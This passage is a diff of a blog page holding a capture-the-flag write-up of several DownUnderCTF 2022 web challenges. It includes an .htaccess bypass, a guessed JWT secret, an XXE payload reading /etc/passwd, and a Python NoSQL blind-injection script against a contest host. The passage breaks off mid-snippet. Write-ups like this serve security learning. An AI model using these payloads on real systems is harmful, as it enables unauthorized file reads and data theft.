@@ -100,10 +100,6 @@
           <a href="/friends/">Friends</a>
         </li>
       
-        <li class="nav-item" data-path="/about/">
-          <a href="/about/">About</a>
-        </li>
-      
     </ul>
   </div>
 </div>
@@ -207,24 +203,20 @@
 
 <h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="helicoptering-htaccess-bypass"><a href="#helicoptering-htaccess-bypass" class="headerlink" title="helicoptering (.htaccess bypass)"></a>helicoptering (.htaccess bypass)</h4><p>This challenge is about bypassing the restrictions of <code>.htaccess</code> file.</p>
 <p>The first <code>.htaccess</code> file：</p>
-<pre><code class="htaccess">RewriteEngine On
-RewriteCond %&#123;HTTP_HOST&#125; !^localhost$
-RewriteRule &quot;.*&quot; &quot;-&quot; [F]
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond %&#123;HTTP_HOST&#125; !^localhost$</span><br><span class="line">RewriteRule &quot;.*&quot; &quot;-&quot; [F]</span><br></pre></td></tr></table></figure>
+
 <p><strong>Solution:</strong> Change the header <code>host</code> to <code>localhost</code></p>
 <p>The second <code>.htaccess</code> file：</p>
-<pre><code class="htaccess">RewriteEngine On
-RewriteCond %&#123;THE_REQUEST&#125; flag
-RewriteRule &quot;.*&quot; &quot;-&quot; [F]
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond %&#123;THE_REQUEST&#125; flag</span><br><span class="line">RewriteRule &quot;.*&quot; &quot;-&quot; [F]</span><br></pre></td></tr></table></figure>
+
 <p>Since <code>%&#123;THE_REQUEST&#125;</code> is getting the full HTTP Request Line, like <code>GET /two/flag.txt HTTP/1.1</code>, and it will check if the word <code>flag</code> is in there, we need to encode some charactors using <strong>ascii</strong> to bypass the restriction.</p>
 <p><strong>Solution:</strong> Change the request <code>flag.txt</code> to <code>f%6clag.txt</code> (<code>%6c</code> is the ascii of <code>l</code>)</p>
 <h4 id="Treasure-Hunt-JWT-key-guess"><a href="#Treasure-Hunt-JWT-key-guess" class="headerlink" title="Treasure Hunt( JWT key guess)"></a>Treasure Hunt( JWT key guess)</h4><p>This challenge asked us to find out the <code>treasure</code></p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926113949.png"></p>
 <p>On Register page, there’s a Treasures field, which means we would need to find out the <code>treasures</code> field for some account.</p>
 <p>After registering an account, I got the JWT token.</p>
-<pre><code class="http">Set-Cookie: access_token_cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY2NDE1NjU0NywianRpIjoiNTMxNDAzMzUtZTA5Yi00NDM3LTgzZjQtM2NkMjcyNTAyMDQ2IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6MzksIm5iZiI6MTY2NDE1NjU0NywiZXhwIjoxNjY0MTU3NDQ3fQ.Voo-9ZzfnKfLDoGrXSNHkIqzw2lJ9nKhI2VBvT_uOT0
-</code></pre>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>access_token_cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY2NDE1NjU0NywianRpIjoiNTMxNDAzMzUtZTA5Yi00NDM3LTgzZjQtM2NkMjcyNTAyMDQ2IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6MzksIm5iZiI6MTY2NDE1NjU0NywiZXhwIjoxNjY0MTU3NDQ3fQ.Voo-9ZzfnKfLDoGrXSNHkIqzw2lJ9nKhI2VBvT_uOT0</span><br></pre></td></tr></table></figure>
+
 <p>Using <code>jwo.io</code>:</p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926114349.png"></p>
 <p>I spent a lot of time to crack this secret, but I found the secret was <code>onepiece</code> as it mentioned a lot here.</p>
@@ -235,197 +227,46 @@ RewriteRule &quot;.*&quot; &quot;-&quot; [F]
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926114801.png"></p>
 <h4 id="dyslexxec-XXE-attack"><a href="#dyslexxec-XXE-attack" class="headerlink" title="dyslexxec(XXE attack)"></a>dyslexxec(XXE attack)</h4><p>According to the name of the challenge, I could guess that it was a challenge related to XXE attack.</p>
 <p>Go to upload page, and we can find that we can upload a <code>xlsm</code> file, as there was a <code>xlsm</code> file attached.</p>
-<pre><code class="python">@app.route(&quot;/upload/testPandasImplementation&quot;)
-def upload_file():
-    return render_template(&quot;upload.html&quot;)
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/upload/testPandasImplementation&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;upload.html&quot;</span>)</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926115318.png"></p>
 <p>Then I tried to upload this <code>xslm</code> file,<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926115546.png"></p>
 <p>It was actually fetching file information from the <code>xlsm</code> file.</p>
 <p>In <code>Dockerfile</code>: </p>
-<pre><code class="dockerfile">RUN echo &#39;DUCTF&#123;test_flag&#125;:x:1001:1001::/tmp:/bin/false&#39; &gt;&gt; /etc/passwd
-</code></pre>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;DUCTF&#123;test_flag&#125;:x:1001:1001::/tmp:/bin/false&#x27;</span> &gt;&gt; /etc/passwd</span></span><br></pre></td></tr></table></figure>
+
 <p>So we need to get the flag from <code>/etc/passwd</code></p>
 <p>In <code>app.py</code>, we could see the uploaded file would be unzipped, and a <code>WORKBOOK</code> file was extracted from it,.</p>
-<pre><code class="python">WORKBOOK = &quot;xl/workbook.xml&quot;
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WORKBOOK = <span class="string">&quot;xl/workbook.xml&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extractWorkbook</span>(<span class="params">filename, outfile=<span class="string">&quot;xml&quot;</span></span>):</span><br><span class="line">    <span class="keyword">with</span> ZipFile(filename, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> <span class="built_in">zip</span>:</span><br><span class="line">        <span class="built_in">zip</span>.extract(WORKBOOK, outfile)</span><br></pre></td></tr></table></figure>
 
-def extractWorkbook(filename, outfile=&quot;xml&quot;):
-    with ZipFile(filename, &quot;r&quot;) as zip:
-        zip.extract(WORKBOOK, outfile)
-</code></pre>
 <p>so I rename the file to <code>fizzbuzz.rar</code> and then unzipped it, then we could find the file <code>xl/workbook.xml</code></p>
-<pre><code class="python">def findInternalFilepath(filename):
-    try:
-        prop = None
-        parser = etree.XMLParser(load_dtd=True, resolve_entities=True)#here&#39;s the issue, it allows to resolve entities -&gt; XXE attack is allowed
-        tree = etree.parse(filename, parser=parser)
-        root = tree.getroot()
-        internalNode = root.find(&quot;.//&#123;http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac&#125;absPath&quot;)#here trying to find the parent node
-        if internalNode != None:
-            prop = &#123;
-                &quot;Fieldname&quot;:&quot;absPath&quot;,
-                &quot;Attribute&quot;:internalNode.attrib[&quot;url&quot;],
-                &quot;Value&quot;:internalNode.text #it&#39;s trying to get value of the tag
-            &#125;
-        return prop
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">findInternalFilepath</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        prop = <span class="literal">None</span></span><br><span class="line">        parser = etree.XMLParser(load_dtd=<span class="literal">True</span>, resolve_entities=<span class="literal">True</span>)<span class="comment">#here&#x27;s the issue, it allows to resolve entities -&gt; XXE attack is allowed</span></span><br><span class="line">        tree = etree.parse(filename, parser=parser)</span><br><span class="line">        root = tree.getroot()</span><br><span class="line">        internalNode = root.find(<span class="string">&quot;.//&#123;http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac&#125;absPath&quot;</span>)<span class="comment">#here trying to find the parent node</span></span><br><span class="line">        <span class="keyword">if</span> internalNode != <span class="literal">None</span>:</span><br><span class="line">            prop = &#123;</span><br><span class="line">                <span class="string">&quot;Fieldname&quot;</span>:<span class="string">&quot;absPath&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Attribute&quot;</span>:internalNode.attrib[<span class="string">&quot;url&quot;</span>],</span><br><span class="line">                <span class="string">&quot;Value&quot;</span>:internalNode.text <span class="comment">#it&#x27;s trying to get value of the tag</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> prop</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;couldnt extract absPath&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>
 
-    except Exception:
-        print(&quot;couldnt extract absPath&quot;)
-        return None
-</code></pre>
 <p>Edit the <code>workbook.xml</code>, add a system entity and put inside the <code>x15ac:absPath</code> tag.</p>
-<pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
-&lt;!DOCTYPE root [
-    &lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;
-]&gt;
-&lt;root&gt;
-&lt;!- ..... --&gt;
-            &lt;mc:Choice Requires=&quot;x15&quot;&gt;
-                &lt;!-- &lt;x15ac:absPath url=&quot;/User/shared&quot; xmlns:x15ac=&quot;http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac&quot; /&gt; --&gt;
-                &lt;x15ac:absPath url=&quot;/User/shared&quot; xmlns:x15ac=&quot;http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac&quot; &gt;
-                    &amp;test;
-            &lt;/x15ac:absPath&gt;
-            &lt;/mc:Choice&gt;
-&lt;!- ..... --&gt;
-&lt;/root&gt;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;!- ..... --&gt;</span><br><span class="line">            &lt;mc:Choice Requires=&quot;x15&quot;&gt;</span><br><span class="line">                &lt;!-- &lt;x15ac:absPath url=&quot;/User/shared&quot; xmlns:x15ac=&quot;http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac&quot; /&gt; --&gt;</span><br><span class="line">                &lt;x15ac:absPath url=&quot;/User/shared&quot; xmlns:x15ac=&quot;http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac&quot; &gt;</span><br><span class="line">                    &amp;test;</span><br><span class="line">            &lt;/x15ac:absPath&gt;</span><br><span class="line">            &lt;/mc:Choice&gt;</span><br><span class="line">&lt;!- ..... --&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
 <p>Again, zip it, and change the suffix to <code>xlsm</code>.</p>
 <p>You will see the flag after uploading it.</p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926120808.png"></p>
 <h4 id="noteworthy-NoSQL-blind-SQL-injection"><a href="#noteworthy-NoSQL-blind-SQL-injection" class="headerlink" title="noteworthy(NoSQL blind SQL injection)"></a>noteworthy(NoSQL blind SQL injection)</h4><p>I thought this was a challenge related to prototype pollution :(</p>
-<pre><code class="javascript">    let admin = await User.findOne(&#123; username: &#39;admin&#39; &#125;)
-    if(!admin) &#123;
-        admin = new User(&#123; username: &#39;admin&#39; &#125;)
-        await admin.save()
-    &#125;
-    let note = await Note.findOne(&#123; noteId: 1337 &#125;)
-    if(!note) &#123;
-        const FLAG = process.env.FLAG || &#39;DUCTF&#123;test_flag&#125;&#39;
-        note = new Note(&#123; owner: admin._id, noteId: 1337, contents: FLAG &#125;)
-        await note.save()
-        admin.notes.push(note)
-        await admin.save()
-    &#125;
-</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> admin = <span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">findOne</span>(&#123; <span class="attr">username</span>: <span class="string">&#x27;admin&#x27;</span> &#125;)</span><br><span class="line"><span class="keyword">if</span>(!admin) &#123;</span><br><span class="line">    admin = <span class="keyword">new</span> <span class="title class_">User</span>(&#123; <span class="attr">username</span>: <span class="string">&#x27;admin&#x27;</span> &#125;)</span><br><span class="line">    <span class="keyword">await</span> admin.<span class="title function_">save</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> note = <span class="keyword">await</span> <span class="title class_">Note</span>.<span class="title function_">findOne</span>(&#123; <span class="attr">noteId</span>: <span class="number">1337</span> &#125;)</span><br><span class="line"><span class="keyword">if</span>(!note) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">FLAG</span> = process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="string">&#x27;DUCTF&#123;test_flag&#125;&#x27;</span></span><br><span class="line">    note = <span class="keyword">new</span> <span class="title class_">Note</span>(&#123; <span class="attr">owner</span>: admin.<span class="property">_id</span>, <span class="attr">noteId</span>: <span class="number">1337</span>, <span class="attr">contents</span>: <span class="variable constant_">FLAG</span> &#125;)</span><br><span class="line">    <span class="keyword">await</span> note.<span class="title function_">save</span>()</span><br><span class="line">    admin.<span class="property">notes</span>.<span class="title function_">push</span>(note)</span><br><span class="line">    <span class="keyword">await</span> admin.<span class="title function_">save</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>Obviously, we need to get the content of Note(id 1337), but it would failed unless we got an <code>admin</code> permission.</p>
-<pre><code class="javascript">router.get(&#39;/edit&#39;, ensureAuthed, async (req, res) =&gt; &#123;
-    let q = req.query
-    try &#123;
-        if(&#39;noteId&#39; in q &amp;&amp; parseInt(q.noteId) != NaN) &#123;
-            console.log(&quot;no problem with noteId&quot;)
-            const note = await Note.findOne(q)
-            console.log(&quot;no problem with finding Note&quot;)
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/edit&#x27;</span>, ensureAuthed, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> q = req.<span class="property">query</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;noteId&#x27;</span> <span class="keyword">in</span> q &amp;&amp; <span class="built_in">parseInt</span>(q.<span class="property">noteId</span>) != <span class="title class_">NaN</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;no problem with noteId&quot;</span>)</span><br><span class="line">            <span class="keyword">const</span> note = <span class="keyword">await</span> <span class="title class_">Note</span>.<span class="title function_">findOne</span>(q)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;no problem with finding Note&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!note) &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>, &#123; <span class="attr">isLoggedIn</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;Note does not exist!&#x27;</span> &#125;)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(note.<span class="property">owner</span>.<span class="title function_">toString</span>() != req.<span class="property">user</span>.<span class="property">userId</span>.<span class="title function_">toString</span>()) &#123;<span class="comment">//here it will check the owner</span></span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>, &#123; <span class="attr">isLoggedIn</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;You are not the owner of this note!&#x27;</span> &#125;)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;edit&#x27;</span>, &#123; <span class="attr">isLoggedIn</span>: <span class="literal">true</span>, <span class="attr">noteId</span>: note.<span class="property">noteId</span>, <span class="attr">contents</span>: note.<span class="property">contents</span> &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Note Id has problem&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>, &#123; <span class="attr">isLoggedIn</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;Invalid request&#x27;</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;this is from the exception&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>, &#123; <span class="attr">isLoggedIn</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;Invalid request&#x27;</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
 
-            if(!note) &#123;
-                return res.render(&#39;error&#39;, &#123; isLoggedIn: true, message: &#39;Note does not exist!&#39; &#125;)
-            &#125;
-
-            if(note.owner.toString() != req.user.userId.toString()) &#123;//here it will check the owner
-                return res.render(&#39;error&#39;, &#123; isLoggedIn: true, message: &#39;You are not the owner of this note!&#39; &#125;)
-            &#125;
-
-            res.render(&#39;edit&#39;, &#123; isLoggedIn: true, noteId: note.noteId, contents: note.contents &#125;)
-        &#125; else &#123;
-            console.log(&quot;Note Id has problem&quot;)
-            return res.render(&#39;error&#39;, &#123; isLoggedIn: true, message: &#39;Invalid request&#39; &#125;)
-        &#125;
-    &#125; catch &#123;
-        console.log(&quot;this is from the exception&quot;)
-        return res.render(&#39;error&#39;, &#123; isLoggedIn: true, message: &#39;Invalid request&#39; &#125;)
-    &#125;
-&#125;)
-</code></pre>
 <p>At least <code>req.query</code> could be leveraged!!</p>
 <p>We can set different content to brute force/guessing the content</p>
-<pre><code class="json">&#123;
-  &quot;noteId&quot;:1337,
-  &quot;content&quot;:&#123;
-    &quot;$gt&quot;:&#39;a&#39;
-  &#125;
-&#125;
-</code></pre>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;noteId&quot;</span><span class="punctuation">:</span><span class="number">1337</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$gt&quot;</span><span class="punctuation">:</span>&#x27;a&#x27;</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
 <p>Here’s the solution. Of course, burpsuite intruder is another choice.</p>
-<pre><code class="python">from requests import Session
-from random import randint
-from string import printable
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"></span><br><span class="line">charset = <span class="built_in">sorted</span>(printable)[<span class="number">6</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_user</span>(<span class="params">username, password</span>):</span><br><span class="line">    r = session.post(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/register&#x27;</span>, json=&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># returns True if the note exists</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">q</span>):</span><br><span class="line">    r = session.get(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/edit?noteId=1337&amp;contents[$gt]=<span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You are not the owner of this note!&#x27;</span> <span class="keyword">in</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://web-noteworthy-873b7c844f49.2022.ductf.dev&#x27;</span></span><br><span class="line">session = Session()</span><br><span class="line">register_user(<span class="string">f&#x27;solve-<span class="subst">&#123;randint(<span class="number">1</span>, <span class="number">10000</span>)&#125;</span>&#x27;</span>, <span class="string">&#x27;solve&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> flag[-<span class="number">1</span>:] != <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    u = <span class="built_in">len</span>(charset)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        m = (l + u) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        candidate = flag + charset[m]</span><br><span class="line">        <span class="keyword">if</span> oracle(candidate):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> oracle(flag + charset[m + <span class="number">1</span>]):</span><br><span class="line">                <span class="keyword">if</span> charset[m + <span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                    flag = flag + charset[m + <span class="number">1</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    flag = candidate</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            l = m - <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            u = m + <span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-charset = sorted(printable)[6:]
-
-
-def register_user(username, password):
-    r = session.post(f&#39;&#123;url&#125;/register&#39;, json=&#123;&#39;username&#39;: username, &#39;password&#39;: password&#125;)
-
-
-# returns True if the note exists
-def oracle(q):
-    r = session.get(f&#39;&#123;url&#125;/edit?noteId=1337&amp;contents[$gt]=&#123;q&#125;&#39;)
-    return &#39;You are not the owner of this note!&#39; in r.text
-
-
-url = &#39;https://web-noteworthy-873b7c844f49.2022.ductf.dev&#39;
-session = Session()
-register_user(f&#39;solve-&#123;randint(1, 10000)&#125;&#39;, &#39;solve&#39;)
-
-flag = &#39;&#39;
-while flag[-1:] != &#39;&#125;&#39;:
-    l = 0
-    u = len(charset)
-    while True:
-        m = (l + u) // 2
-
-        candidate = flag + charset[m]
-        if oracle(candidate):
-            if not oracle(flag + charset[m + 1]):
-                if charset[m + 1] == &#39;&#125;&#39;:
-                    flag = flag + charset[m + 1]
-                else:
-                    flag = candidate
-                print(flag)
-                break
-            l = m - 1
-        else:
-            u = m + 1
-</code></pre>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926131752.png"></p>
 <h4 id="no-symlink-Symlink-and-file-permission-trick"><a href="#no-symlink-Symlink-and-file-permission-trick" class="headerlink" title="no-symlink(Symlink and file permission trick)"></a>no-symlink(Symlink and file permission trick)</h4><p>The website allows us to upload a tar file, and it will extract the file.</p>
 <p>The difficulty is that it detects the symlink files and delete all.</p>
 <p>How do we bypass it?</p>
-<pre><code class="ruby">post &#39;/&#39; do
-  unless params[:tarfile] &amp;&amp; (tempfile = params[:tarfile][:tempfile])
-    return err &quot;File not sent&quot;
-  end
-  unless tempfile.size &lt;= 10240
-    return err &quot;File too big&quot;
-  end 
-  
-  path = SecureRandom.hex 16
-  unless Dir.mkdir &quot;uploads/#&#123;path&#125;&quot;, 0755
-    return err &quot;Error creating directory&quot;
-  end
-  unless system &quot;tar -xvf #&#123;tempfile.path&#125; -C uploads/#&#123;path&#125;&quot;
-    return err &quot;Error extracting tar file&quot;
-  end
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">post <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:tarfile</span>] &amp;&amp; (tempfile = params[<span class="symbol">:tarfile</span>][<span class="symbol">:tempfile</span>])</span><br><span class="line">    <span class="keyword">return</span> err <span class="string">&quot;File not sent&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">unless</span> tempfile.size &lt;= <span class="number">10240</span></span><br><span class="line">    <span class="keyword">return</span> err <span class="string">&quot;File too big&quot;</span></span><br><span class="line">  <span class="keyword">end</span> </span><br><span class="line">  </span><br><span class="line">  path = <span class="title class_">SecureRandom</span>.hex <span class="number">16</span></span><br><span class="line">  <span class="keyword">unless</span> <span class="title class_">Dir</span>.mkdir <span class="string">&quot;uploads/<span class="subst">#&#123;path&#125;</span>&quot;</span>, <span class="number">0755</span></span><br><span class="line">    <span class="keyword">return</span> err <span 